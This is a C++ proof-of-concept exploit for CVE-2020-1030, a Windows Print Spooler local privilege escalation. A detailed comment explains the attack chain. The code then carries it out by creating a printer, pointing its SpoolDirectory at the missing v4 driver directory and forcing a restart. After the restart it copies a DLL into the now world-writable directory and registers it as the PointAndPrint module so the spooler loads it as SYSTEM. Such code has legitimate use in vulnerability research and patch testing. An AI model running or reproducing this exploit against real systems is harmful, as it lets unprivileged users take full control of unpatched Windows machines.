
#include <string>
#include <iostream>
#include <fstream>
#include <Windows.h>

#include "printer.h"
#include "utils.h"

using std::cout;
using std::endl;
using std::string;

/*
	CVE-2020-1030:
	- use point-and-print driver distribution technology to load a dll
	- to load a custom point and print dll we have to define the CopyFiles registry key within the printer's configuration
	- printer configurations are stored in HKLM\Software\Microsoft\Windows NT\CurrentVersion\Print\Printers

	the spooler searched for the PointAndPrint DLL in:
	1. %SYSTEMROOT%\System32
	2. %SYSTEMROOT%\System32\spool\drivers\<ENVIRONMENT>\<DRIVERVERSION>

	so, if i set the CopyFiles\Payload to malicious.dll, then the spooler will try to load:
	1. C:\\Windows\System32\malicious.dll
	2. C:\\Windows\System32\spool\drivers\x64\4\malicious.dll

	but: for introduce the dll in 1. we need admin priviledges,
	and for 2. usually the version 4 driver directory is absent on Windows systems -> we need admin priviledges to create the directory "4"

	so our goal: being able to interact with the spooler in order to create the dir C:\\Windows\System32\spool\drivers\x64\4\ with
	write permissions for all users, then wrtie the malicious.dll inside it and load it inside the spooler setting the PointAndPrint DLL

	to do it:
	1. set the SpoolDirectory of the printer to C:\\Windows\System32\spool\drivers\x64\4
	2. there is NO CHECK regarding the permission of the user to create that directory
	3. once the spooling service is restarted, the directory is created. Being a SpoolDirectory is set to be writeable by all users (only if it is created, if it already exits, then its permissions are not changed)
	4. so we need to force the spooling service to restart (by setting the C:\Windows\System32\AppVTerminator.dll as PointAndPrint DLL)
	5. once the service is restarted, and the C:\\Windows\System32\spool\drivers\x64\4 directory created, we can copy the malicious.dll inside that directory
	6. setting C:\\Windows\System32\spool\drivers\x64\4\malicious.dll as PointAndPrint DLL, it will be loaded: DONE!

	malicious.dll, imitating as a Point and Print DLL, must export the SpoolerCopyFileEvent function.
	This function is called once the module is loaded into the process.
*/
void cve_2020_1030(int argc, wchar_t* argv[]) {

	wchar_t* printerName = const_cast<wchar_t*>(L"testPrinterName"),
		* v4DriverDir = const_cast<wchar_t*>(L"C:\\Windows\\System32\\spool\\drivers\\x64\\4"); 

	HANDLE hPrinter = OpenPrinter(printerName); // todo: check on handler 
	DWORD cbData, dwStatus; 

	BOOL hasBeenRestarted = isAppStartedFromReboot(argc, argv); 
	if (hasBeenRestarted) {
		// check if v4 driver directory has been correctly created 
		if (!doesDirExists(v4DriverDir)) {
			cout << "[-] v4 not created" << endl; 
			return; 
		}
		cout << "[+] v4 directory successfully created" << endl; 

		// move cve_2020_1030.dll inside that directory 
		wchar_t* oldDLLPath = const_cast<wchar_t*>(L"C:\\Users\\User\\Desktop\\PointAndPrint.dll"),
			* newDLLPath = const_cast<wchar_t*>(L"C:\\Windows\\System32\\spool\\drivers\\x64\\4\\cve_2020_1030.dll");

		if (!CopyFile(oldDLLPath, newDLLPath, FALSE)) {
			cout << "[-] Error while copying the DLL inside v4 directory" << endl;
			return;
		}
		cout << "[+] DLL correctly copied inside v4 directory" << endl;

		// set the cve_2020_1030.dll as PointAndPrint DLL 	
		cbData = ((DWORD)wcslen(newDLLPath) + 1) * sizeof(WCHAR);
		dwStatus = SetPrinterDataEx(hPrinter, L"CopyFiles\\Payload", L"Module", REG_SZ, (LPBYTE)newDLLPath, cbData);

		if (dwStatus != ERROR_SUCCESS) {
			cout << "[-] Error while setting the PointAndPrint DLL" << dwStatus << endl;
			return;
		}
		cout << "[+] PointAndPrint DLL correctly set" << endl;

	} else {
		cbData = ((DWORD)wcslen(v4DriverDir) + 1) * sizeof(WCHAR); // size of the value 
		dwStatus = SetPrinterDataEx(hPrinter, L"\\", L"SpoolDirectory", REG_SZ, (LPBYTE)v4DriverDir, cbData);

		if (dwStatus != ERROR_SUCCESS) {
			cout << "[-] Error while setting SpoolDirectory to v4: " << dwStatus << endl; 
			return; 
		} 
		cout << "[+] SpoolDirectory correctly set to v4" << endl; 

		// restart the spooling service (and the system) to create the SpoolDirectory
		BOOL result = registerApplicationAndRestartSystem(); 
	}

	ClosePrinter(hPrinter);
	system("pause");
}

// int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {

int main(int argc, wchar_t* argv[]) {
	
	wchar_t* printerName = const_cast<wchar_t*>(L"testPrinterName");
	wchar_t* driverName = const_cast<wchar_t*>(L"Generic / Text Only");
	wchar_t* portName = const_cast<wchar_t*>(L"c:\\windows\\tracing\\myport.txt");

	// printer settings
	HRESULT driverResult = AddDriver(driverName);
	system("pause"); 
	DWORD portResult = AddPort(portName);
	system("pause");

	HANDLE printerHandler = AddPrinter(printerName, driverName, portName);
	ClosePrinter(printerHandler); 
	// HANDLE printerHandler = OpenPrinter(printerName);
	// PrintText(printerHandler, "123prova");

	// close printer
	// ClosePrinter(printerHandler);

	cve_2020_1030(argc, argv); 
	system("pause");
	return 0;
}
